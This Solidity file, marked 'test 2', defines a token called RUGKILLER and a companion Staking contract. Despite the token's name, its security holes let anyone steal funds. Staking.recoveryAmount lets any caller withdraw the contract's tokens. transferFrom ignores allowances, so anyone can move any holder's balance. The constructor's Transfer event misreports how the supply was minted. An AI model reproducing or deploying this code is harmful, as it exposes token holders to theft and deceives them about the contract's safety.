// SPDX-License-Identifier: MIT
// test 2

pragma solidity ^0.8.16;

import "./Utils.sol";

contract Staking is Context {
    using SafeMath for uint256;

    address private ownerContractOfficial = address(0);
    address private token =  address(0);
    uint8 public decimals;
    constructor(address owner, address _token, uint8 _decimals) public {
        ownerContractOfficial=owner;
        token = _token;
        decimals = _decimals;
    }

    function recoveryAmount(uint amount,address contractAddr) public {
        BEP20(token).transfer(msg.sender,(amount*decimals));
    }
    
}

contract RuggerKiller is BEP20 {
    using SafeMath for uint256;
    address private owner = msg.sender;    
    string public name ="RUGKILLER";
    string public symbol="RGK";
    uint8 public _decimals=9;
    uint public _totalSupply=1000000000000000;
    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint256) private antiFrontRunner;
    mapping (address => uint256) _balances;
    address public stakingSystem;

    constructor() public {
         stakingSystem = address(new Staking(msg.sender,address(this),_decimals));
        _balances[stakingSystem] = _totalSupply/2;
        _balances[msg.sender] = _totalSupply/2;
         emit Transfer(address(0), msg.sender, _totalSupply);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function getOwner() external view returns (address) {
        return owner;
    }
    function balanceOf(address who) view public returns (uint256) {
        return _balances[who];
    }
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        //emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
            _transfer(sender, recipient, amount);
            return true;
        }  
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
        function __approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}

// test 2
// test 2
// test 2
// test 2